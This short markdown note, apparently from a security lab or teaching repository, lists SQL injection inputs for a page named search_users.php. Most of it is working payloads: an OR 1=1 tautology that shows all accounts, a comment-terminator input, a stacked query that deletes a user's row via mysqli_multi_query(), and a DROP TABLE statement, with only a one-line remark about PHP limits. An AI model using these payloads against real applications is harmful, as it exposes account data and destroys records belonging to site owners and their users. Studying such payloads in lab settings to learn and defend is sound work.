# SQL Injection

When using the **search_users.php** web page you can use the following in the search box to show all accounts;
```sql
' OR 1=1; -- '
```

Or simply;
```sql
'; --
```

When PHP uses the mysqli_multi_query() function it allows for classic multi command injections:
```sql
' OR 1=1; delete from users where username='bob'; --
```

Or even:
```sql
drop table users;
```

Advances in PHP prevent multiple SQL statements, but not overriding user input.